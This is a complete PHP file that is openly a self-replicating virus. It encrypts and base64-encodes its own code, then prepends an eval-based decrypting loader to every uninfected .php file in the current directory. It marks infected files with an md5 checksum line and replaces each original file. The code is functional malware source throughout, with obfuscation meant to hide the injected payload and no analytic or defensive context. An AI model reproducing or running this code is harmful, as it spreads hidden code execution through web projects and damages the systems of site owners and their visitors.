<?php

// VIRUS:START

function execute($virus){

    $filenames = glob('*.php');

    // Check each file
    foreach($filenames as $filename){

        // Open File
        $script = fopen($filename, "r");

        // Check not infected
        $first_line = fgets($script);
        $virus_hash = md5($filename);
        if(strpos($first_line, $virus_hash) == false) {

            // Let's write to a new file, as opposed to reading the whole
            // Script in to memory, to avoid issues with large files
            $infected = fopen("$filename.infected", "w");

            $checksum = '<?php // Checksum: ' . $virus_hash . ' ?>';
            $infection = '<?php ' . encryptedVirus($virus) . ' ?>';

            fputs($infected, $checksum);
            fputs($infected, $infection);
            fputs($infected, $first_line);

            while($contents = fgets($script)){
                fputs($infected, $contents);
            }

            fclose($script);
            fclose($infected);
            unlink("$filename");
            rename("$filename.infected", $filename);

        }              
        
    }
}

function encryptedVirus($virus){
    $output = false;
    $encryption_method = 'AES-256-CBC';
    $secret_iv = 'chocolate';
    $str = '0123456789abcdef';    
    $secret_key = '';    
    for($i=0;$i<64;++$i) $secret_key.= $str[rand(0,strlen($str)-1)];
    $secret_key = pack('H*', $secret_key);

    // Hash
    $key = hash('sha256', $secret_key);

    // IV - Encrypt AES-256-CBC - 16 bytes
    $iv = substr(hash('sha256', $secret_iv), 0, 16);

    // Encrypt
    $output = openssl_encrypt($virus, $encryption_method, $key, 0, $iv);
    
    // Encode
    $encodedOutput = base64_encode($output);   
    $encodedIV = base64_encode($iv);
    $encodedKey = base64_encode($key);

    $payload = "
        \$output = '$encodedOutput';
        \$iv = '$encodedIV';        
        \$key = '$encodedKey';       
        \$virus = openssl_decrypt(base64_decode(\$output), 'AES-256-CBC', base64_decode(\$key), 0, base64_decode(\$iv));
        eval(\$virus);
        execute(\$virus);
    ";

    return $payload;
}

$virus = file_get_contents(__FILE__);
$virus = substr($virus, strpos($virus, "// VIRUS:START"));
$virus = substr($virus, 0, strpos($virus, "\n// VIRUS:END"));
execute($virus);

// VIRUS:END

?>